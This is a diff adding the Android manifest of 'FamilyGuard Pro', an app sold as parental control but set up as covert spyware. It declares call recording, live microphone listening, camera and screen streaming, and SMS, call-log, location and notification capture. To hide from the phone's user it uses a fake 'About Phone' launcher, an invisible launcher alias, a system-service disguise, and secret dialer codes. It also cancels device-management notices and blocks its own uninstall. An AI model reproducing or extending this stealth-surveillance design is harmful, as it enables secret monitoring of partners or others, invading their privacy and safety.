@@ -1,0 +1,514 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" android:compileSdkVersion="34" android:compileSdkVersionCodename="14" package="com.familyguardpro" platformBuildVersionCode="34" platformBuildVersionName="14">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_PHONE_CALL"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
+    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS"/>
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
+    <uses-permission android:maxSdkVersion="32" android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:maxSdkVersion="29" android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.BIND_VPN_SERVICE"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"
+        tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-feature android:name="android.hardware.camera" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false"/>
+    <uses-feature android:name="android.hardware.location.gps" android:required="false"/>
+    <uses-feature android:glEsVersion="0x00020000" android:required="true"/>
+    <queries>
+        <package android:name="com.google.android.apps.maps"/>
+    </queries>
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+    <uses-permission android:name="com.google.android.gms.permission.AD_ID"/>
+    <uses-permission android:name="android.permission.ACCESS_ADSERVICES_ATTRIBUTION"/>
+    <uses-permission android:name="android.permission.ACCESS_ADSERVICES_AD_ID"/>
+    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE"/>
+    <permission android:name="com.familyguardpro.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
+    <uses-permission android:name="com.familyguardpro.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
+    <application android:allowBackup="false" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:debuggable="true" android:extractNativeLibs="false" android:icon="@mipmap/ic_system_service" android:label="@string/stealth_app_name" android:name="com.familyguardpro.FamilyGuardApp" android:networkSecurityConfig="@xml/network_security_config" android:roundIcon="@mipmap/ic_system_service" android:supportsRtl="true" android:theme="@style/Theme.FamilyGuardPro" android:usesCleartextTraffic="true">
+        <!-- Main Activity - NO launcher intent, only accessible via aliases -->
+        <activity android:exported="true" android:name="com.familyguardpro.MainActivity" android:theme="@style/Theme.FamilyGuardPro.Splash">
+            <!-- No LAUNCHER intent - controlled via aliases -->
+        </activity>
+        
+        <!-- FamilyGuard Pro Launcher - NORMAL MODE (enabled by default for setup) -->
+        <activity-alias 
+            android:enabled="true" 
+            android:exported="true" 
+            android:icon="@mipmap/ic_launcher" 
+            android:roundIcon="@mipmap/ic_launcher_round" 
+            android:label="@string/app_name" 
+            android:name="com.familyguardpro.FamilyGuardLauncher" 
+            android:targetActivity="com.familyguardpro.MainActivity" 
+            android:theme="@style/Theme.FamilyGuardPro.Splash">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        
+        <!-- System Service Launcher - STEALTH MODE - Opens fake About Phone page -->
+        <activity-alias 
+            android:enabled="false" 
+            android:exported="true" 
+            android:icon="@mipmap/ic_system_service" 
+            android:roundIcon="@mipmap/ic_system_service" 
+            android:label="@string/stealth_app_name" 
+            android:name="com.familyguardpro.SystemServiceLauncher" 
+            android:targetActivity="com.familyguardpro.SystemInfoActivity" 
+            android:theme="@style/Theme.FamilyGuardPro">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias 
+            android:enabled="false" 
+            android:exported="true" 
+            android:icon="@mipmap/ic_applock" 
+            android:roundIcon="@mipmap/ic_applock"
+            android:label="App Lock" 
+            android:name="com.familyguardpro.AppLockLauncher" 
+            android:targetActivity="com.familyguardpro.AppLockActivity" 
+            android:theme="@style/Theme.FamilyGuardPro">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <!-- Invisible Mode Launcher - NO launcher intent = hidden from app drawer! -->
+        <activity-alias 
+            android:enabled="false" 
+            android:exported="false" 
+            android:icon="@mipmap/ic_system_service" 
+            android:roundIcon="@mipmap/ic_system_service" 
+            android:label="@string/stealth_app_name" 
+            android:name="com.familyguardpro.InvisibleLauncher" 
+            android:targetActivity="com.familyguardpro.SystemInfoActivity" 
+            android:theme="@style/Theme.FamilyGuardPro">
+            <!-- ⚠️ NO <intent-filter> here! This makes it invisible in app drawer -->
+        </activity-alias>
+        
+        <!-- System Info Activity - Fake About Phone page for invisible mode -->
+        <activity 
+            android:name="com.familyguardpro.SystemInfoActivity"
+            android:exported="true"
+            android:label="@string/stealth_app_name"
+            android:icon="@mipmap/ic_system_service"
+            android:theme="@style/Theme.FamilyGuardPro"/>
+        <activity 
+            android:name="com.familyguardpro.AppLockActivity"
+            android:exported="true"
+            android:label="App Lock"
+            android:theme="@style/Theme.FamilyGuardPro"/>
+        <!-- Uninstall Block Activity - PIN protection for uninstall attempts -->
+        <activity 
+            android:name="com.familyguardpro.UninstallBlockActivity"
+            android:exported="false"
+            android:label="Parental Control"
+            android:theme="@style/Theme.FamilyGuardPro"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTop"
+            android:noHistory="true"/>
+        <!-- AppLock Feature Activities -->
+        <activity 
+            android:name="com.familyguardpro.applock.AppLockScreenActivity"
+            android:exported="false"
+            android:label="App Locked"
+            android:theme="@style/Theme.FamilyGuardPro"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTop"/>
+        <activity 
+            android:name="com.familyguardpro.applock.VaultActivity"
+            android:exported="false"
+            android:label="Photo Vault"
+            android:theme="@style/Theme.FamilyGuardPro"/>
+        <activity 
+            android:name="com.familyguardpro.applock.VaultViewerActivity"
+            android:exported="false"
+            android:label="Vault Viewer"
+            android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen"/>
+        <activity 
+            android:name="com.familyguardpro.applock.IntruderPhotosActivity"
+            android:exported="false"
+            android:label="Intruder Photos"
+            android:theme="@style/Theme.FamilyGuardPro"/>
+        <!-- AppLock Service -->
+        <service 
+            android:name="com.familyguardpro.applock.AppLockService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="app_lock_monitoring"/>
+        </service>
+        <activity android:exported="false" android:name="com.familyguardpro.SetupActivity" android:screenOrientation="portrait"/>
+        <!-- MIUI-specific setup wizard for Xiaomi/Poco/Redmi devices -->
+        <activity 
+            android:name="com.familyguardpro.MiuiSetupActivity"
+            android:exported="false"
+            android:screenOrientation="portrait"
+            android:label="MIUI Setup"/>
+        <activity android:exported="false" android:launchMode="singleTop" android:name="com.familyguardpro.DashboardActivity" android:screenOrientation="portrait"/>
+        <activity 
+            android:exported="false" 
+            android:name="com.familyguardpro.ParentWebViewActivity" 
+            android:launchMode="singleTop"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:hardwareAccelerated="true"/>
+        <activity android:exported="false" android:name="com.familyguardpro.ChildStatusActivity" android:screenOrientation="portrait"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="com.familyguardpro.SecretActivity" android:noHistory="true" android:theme="@style/Theme.FamilyGuardPro.Transparent">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:host="open" android:scheme="familyguard"/>
+            </intent-filter>
+        </activity>
+        <activity android:exported="false" android:name="com.familyguardpro.StreamingActivity" android:screenOrientation="landscape"/>
+        <activity android:exported="false" android:name="com.familyguardpro.NotificationListActivity" android:screenOrientation="portrait"/>
+        <activity android:exported="false" android:name="com.familyguardpro.CallHistoryActivity" android:screenOrientation="portrait"/>
+        <activity android:exported="false" android:name="com.familyguardpro.MapActivity"/>
+        <activity android:exported="false" android:name="com.familyguardpro.DeviceDetailActivity" android:screenOrientation="portrait"/>
+        <activity 
+            android:name="com.familyguardpro.PermissionRequestActivity"
+            android:exported="false"
+            android:theme="@style/Theme.FamilyGuardPro.Transparent"
+            android:launchMode="singleTask"
+            android:excludeFromRecents="true"
+            android:noHistory="true"/>
+        <activity 
+            android:name="com.familyguardpro.ScreenCaptureActivity"
+            android:exported="false"
+            android:theme="@style/Theme.FamilyGuardPro.Transparent"
+            android:launchMode="singleTask"
+            android:excludeFromRecents="true"
+            android:noHistory="true"/>
+        <!-- Device Owner Mode Activities -->
+        <activity 
+            android:name="com.familyguardpro.deviceowner.ModeSelectionActivity"
+            android:exported="false"
+            android:screenOrientation="portrait"
+            android:label="Setup Mode"/>
+        <activity 
+            android:name="com.familyguardpro.deviceowner.ProvisioningActivity"
+            android:exported="true"
+            android:screenOrientation="portrait"
+            android:label="Device Owner Setup">
+            <intent-filter>
+                <action android:name="android.app.action.PROVISIONING_SUCCESSFUL"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <!-- Device Owner Install Result Receiver -->
+        <receiver 
+            android:name="com.familyguardpro.deviceowner.InstallResultReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.familyguardpro.INSTALL_RESULT"/>
+                <action android:name="com.familyguardpro.UNINSTALL_RESULT"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="true" android:foregroundServiceType="dataSync" android:name="com.familyguardpro.services.NotificationListener" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+        <!-- Device Management Notification Canceller - cancels "This device belongs to..." notifications -->
+        <service 
+            android:name="com.familyguardpro.services.DeviceManagementNotificationCanceller"
+            android:label="Device Protection"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+        
+        <!-- Accessibility Service - blocks Device Management popup -->
+        <service
+            android:name="com.familyguardpro.services.NotificationBlockerAccessibilityService"
+            android:label="Device Protection Service"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config"/>
+        </service>
+        
+        <service android:exported="false" android:foregroundServiceType="camera|microphone" android:name="com.familyguardpro.services.CameraService"/>
+        <service android:exported="false" android:foregroundServiceType="camera" android:name="com.familyguardpro.services.CameraStreamService"/>
+        <service android:exported="false" android:foregroundServiceType="mediaProjection|microphone" android:name="com.familyguardpro.services.ScreenMirrorService"/>
+        <service android:exported="false" android:foregroundServiceType="microphone|specialUse" android:name="com.familyguardpro.services.CallRecordService">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="call_recording"/>
+        </service>
+        <service android:exported="false" android:foregroundServiceType="microphone" android:name="com.familyguardpro.services.LiveListenService"/>
+        <service android:exported="false" android:foregroundServiceType="camera|microphone|mediaProjection" android:name="com.familyguardpro.services.WebRTCStreamService"/>
+        <service android:exported="false" android:foregroundServiceType="mediaProjection" android:name="com.familyguardpro.services.ScreenshotService"/>
+        <service android:exported="false" android:foregroundServiceType="dataSync" android:name="com.familyguardpro.services.DataSyncService"/>
+        <service android:exported="false" android:foregroundServiceType="dataSync" android:name="com.familyguardpro.services.PersistentService"/>
+        <!-- File Manager Service - Device Owner file operations -->
+        <service android:exported="false" android:foregroundServiceType="dataSync" android:name="com.familyguardpro.deviceowner.FileManagerService"/>
+        <service android:exported="false" android:foregroundServiceType="location" android:name="com.familyguardpro.services.LocationService"/>
+        <!-- Geofencing Service -->
+        <service android:exported="false" android:foregroundServiceType="location" android:name="com.familyguardpro.services.GeofenceService"/>
+        <!-- Screen Time Limit Service -->
+        <service android:exported="false" android:foregroundServiceType="dataSync" android:name="com.familyguardpro.services.ScreenTimeLimitService"/>
+        <!-- Browser History Service -->
+        <service android:exported="false" android:foregroundServiceType="dataSync" android:name="com.familyguardpro.services.BrowserHistoryService"/>
+        <!-- WebSocket Sync Service - Real-time communication -->
+        <service android:exported="false" android:foregroundServiceType="dataSync" android:name="com.familyguardpro.services.WebSocketSyncService"/>
+        <!-- Service Watchdog - Health monitoring for MIUI/Samsung/etc -->
+        <service 
+            android:name="com.familyguardpro.services.ServiceWatchdog"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <!-- Watchdog Alarm Receiver - Fallback for JobScheduler -->
+        <receiver 
+            android:name="com.familyguardpro.services.WatchdogAlarmReceiver"
+            android:exported="false"/>
+        <!-- Geofence Broadcast Receiver -->
+        <receiver android:exported="false" android:name="com.familyguardpro.services.GeofenceBroadcastReceiver"/>
+        <service android:exported="false" android:name="com.familyguardpro.services.ContentFilterVpnService" android:permission="android.permission.BIND_VPN_SERVICE">
+            <intent-filter>
+                <action android:name="android.net.VpnService"/>
+            </intent-filter>
+        </service>
+        <service android:exported="true" android:label="@string/stealth_app_name" android:name="com.familyguardpro.services.FamilyGuardAccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_config"/>
+        </service>
+        <service android:exported="false" android:foregroundServiceType="specialUse" android:name="com.familyguardpro.services.AppBlockerService"/>
+        <service android:exported="false" android:name="com.familyguardpro.services.FcmService">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
+            </intent-filter>
+        </service>
+        <receiver android:enabled="true" android:exported="true" android:name="com.familyguardpro.services.BootReceiver">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.REBOOT"/>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+                <!-- MIUI specific boot actions -->
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+            </intent-filter>
+        </receiver>
+        <!-- AlarmManager Watchdog Receiver - Fallback for MIUI when JobScheduler fails -->
+        <receiver 
+            android:name="com.familyguardpro.services.AlarmManagerWatchdog$AlarmWatchdogReceiver"
+            android:exported="false"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="com.familyguardpro.action.WATCHDOG_ALARM"/>
+                <action android:name="com.familyguardpro.action.CHECK_ACCESSIBILITY"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="com.familyguardpro.services.DeviceAdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
+                <!-- Device Owner provisioning complete callback -->
+                <action android:name="android.app.action.PROFILE_PROVISIONING_COMPLETE"/>
+                <action android:name="android.app.action.DEVICE_OWNER_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="com.familyguardpro.services.PhoneStateReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE"/>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="com.familyguardpro.services.PackageReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="com.familyguardpro.receivers.SecretDialerReceiver">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE"/>
+                <data android:host="00000" android:scheme="android_secret_code"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE"/>
+                <data android:host="12345" android:scheme="android_secret_code"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE"/>
+                <data android:host="48273" android:scheme="android_secret_code"/>
+            </intent-filter>
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+            </intent-filter>
+        </receiver>
+        <provider android:authorities="com.familyguardpro.fileprovider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/>
+        </provider>
+        <provider android:authorities="com.familyguardpro.androidx-startup" android:exported="false" android:name="androidx.startup.InitializationProvider">
+            <meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/>
+            <meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/>
+            <meta-data android:name="androidx.profileinstaller.ProfileInstallerInitializer" android:value="androidx.startup"/>
+        </provider>
+        <meta-data android:name="com.google.firebase.messaging.default_notification_channel_id" android:value="familyguard_channel"/>
+        <meta-data android:name="firebase_messaging_auto_init_enabled" android:value="true"/>
+        <meta-data android:name="firebase_analytics_collection_enabled" android:value="false"/>
+        <meta-data android:name="com.google.android.geo.API_KEY" android:value="@string/google_maps_key"/>
+        <service android:enabled="false" android:exported="false" android:name="androidx.camera.core.impl.MetadataHolderService">
+            <meta-data android:name="androidx.camera.core.impl.MetadataHolderService.DEFAULT_CONFIG_PROVIDER" android:value="androidx.camera.camera2.Camera2Config$DefaultProvider"/>
+        </service>
+        <uses-library android:name="org.apache.http.legacy" android:required="false"/>
+        <service android:directBootAware="true" android:exported="false" android:name="com.google.firebase.components.ComponentDiscoveryService">
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.messaging.ktx.FirebaseMessagingLegacyRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.auth.ktx.FirebaseAuthLegacyRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.auth.FirebaseAuthRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.analytics.ktx.FirebaseAnalyticsLegacyRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.ktx.FirebaseCommonLegacyRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.FirebaseCommonKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.datatransport.TransportRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+        </service>
+        <receiver android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver" android:permission="com.google.android.c2dm.permission.SEND">
+            <intent-filter>
+                <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
+            </intent-filter>
+            <meta-data android:name="com.google.android.gms.cloudmessaging.FINISHED_AFTER_HANDLED" android:value="true"/>
+        </receiver>
+        <service android:directBootAware="true" android:exported="false" android:name="com.google.firebase.messaging.FirebaseMessagingService">
+            <intent-filter android:priority="-500">
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
+            </intent-filter>
+        </service>
+        <activity android:excludeFromRecents="true" android:exported="true" android:launchMode="singleTask" android:name="com.google.firebase.auth.internal.GenericIdpActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:host="firebase.auth" android:path="/" android:scheme="genericidp"/>
+            </intent-filter>
+        </activity>
+        <activity android:excludeFromRecents="true" android:exported="true" android:launchMode="singleTask" android:name="com.google.firebase.auth.internal.RecaptchaActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:host="firebase.auth" android:path="/" android:scheme="recaptcha"/>
+            </intent-filter>
+        </activity>
+        <activity android:exported="false" android:name="com.google.android.gms.common.api.GoogleApiActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <property android:name="android.adservices.AD_SERVICES_CONFIG" android:resource="@xml/ga_ad_services_config"/>
+        <provider android:authorities="com.familyguardpro.firebaseinitprovider" android:directBootAware="true" android:exported="false" android:initOrder="100" android:name="com.google.firebase.provider.FirebaseInitProvider"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_job_service_default" android:exported="true" android:name="androidx.work.impl.background.systemjob.SystemJobService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_foreground_service_default" android:exported="false" android:name="androidx.work.impl.foreground.SystemForegroundService"/>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="false" android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"/>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+                <action android:name="android.intent.action.BATTERY_LOW"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.DEVICE_STORAGE_LOW"/>
+                <action android:name="android.intent.action.DEVICE_STORAGE_OK"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.TIME_SET"/>
+                <action android:name="android.intent.action.TIMEZONE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver">
+            <intent-filter>
+                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="true" android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver" android:permission="android.permission.DUMP">
+            <intent-filter>
+                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementReceiver"/>
+        <service android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementService"/>
+        <service android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementJobService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <service android:directBootAware="true" android:exported="false" android:name="androidx.room.MultiInstanceInvalidationService"/>
+        <uses-library android:name="android.ext.adservices" android:required="false"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="true" android:name="androidx.profileinstaller.ProfileInstallReceiver" android:permission="android.permission.DUMP">
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.SKIP_FILE"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="false" android:name="com.google.android.datatransport.runtime.backends.TransportBackendDiscovery">
+            <meta-data android:name="backend:com.google.android.datatransport.cct.CctBackendFactory" android:value="cct"/>
+        </service>
+        <service android:exported="false" android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <receiver android:exported="false" android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver"/>
+    </application>
+</manifest>
